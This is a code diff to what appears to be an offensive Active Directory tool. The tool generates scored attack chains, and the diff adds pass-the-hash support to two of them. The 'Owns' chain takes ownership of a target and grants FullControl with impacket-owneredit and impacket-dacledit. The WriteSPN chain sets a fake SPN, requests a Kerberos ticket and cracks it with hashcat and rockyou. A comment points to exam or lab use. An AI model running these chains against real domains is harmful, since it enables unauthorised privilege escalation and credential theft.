@@ -1262,17 +1262,19 @@ def run(report, store, ui=None):
                 # iter-51: Owns = target's owner. Grant self WriteDacl, then
                 # chain to whatever the target enables (usually ForceChange
                 # or GenericAll).
+                # iter-101: hash-only actor uses _impacket_uri + _impacket_hash.
+                _hf = f" {_impacket_hash}" if _impacket_hash else ""
                 chains.append(Chain("R-OWNS", "reclaim ownership -> full ACL",
                     f"Owns: {actor} -> {tgt}",
                     crit=7, conf=0.75, ready=1.2, prox=0.85,       # score 5.36
                     commands=[
                         f"# grant self WriteDacl via ownership",
                         f"impacket-owneredit -action write -new-owner "
-                        f"'{_owned}' -target '{tgt}' "
-                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                        f"'{_owned}' -target '{tgt}'{_hf} "
+                        f"{_impacket_uri}",
                         f"impacket-dacledit -action write -rights FullControl "
-                        f"-principal '{_owned}' -target '{tgt}' "
-                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                        f"-principal '{_owned}' -target '{tgt}'{_hf} "
+                        f"{_impacket_uri}",
                         f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AllExtendedRights":
@@ -1291,15 +1293,20 @@ def run(report, store, ui=None):
                 # on any user (that itself has no SPN today), then request
                 # a TGS for that SPN which encrypts with the target's NT
                 # hash - offline crackable. Exam-legal, no relay.
+                # iter-101: hash-auth via _netexec_auth / _impacket_uri +
+                # _impacket_hash. impacket-addspn accepts -hashes too.
+                _addspn_auth = (f"-hashes '{_blank_lm}:{_owned_hash}'"
+                                if _owned_hash else f"-p '{_owned_pw}'")
+                _hf = f" {_impacket_hash}" if _impacket_hash else ""
                 chains.append(Chain("R-WRITESPN", "targeted kerberoast",
                     f"WriteSPN: {actor} -> {tgt} "
                     f"(set fake SPN -> kerberoast -> crack {tgt})",
                     crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
                     commands=[
-                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '{_owned_pw}' "
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth} "
                         f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                         f"impacket-GetUserSPNs -request-user '{tgt}' "
-                        f"-dc-ip {_dc_e} '{_dom_e}/{_owned}:{_owned_pw}' | tee tgs.txt",
+                        f"-dc-ip {_dc_e} {_impacket_uri}{_hf} | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                         "# then PtH the recovered NT hash (see R7)",
                     ], src=edge["src"], line=edge["line"]))
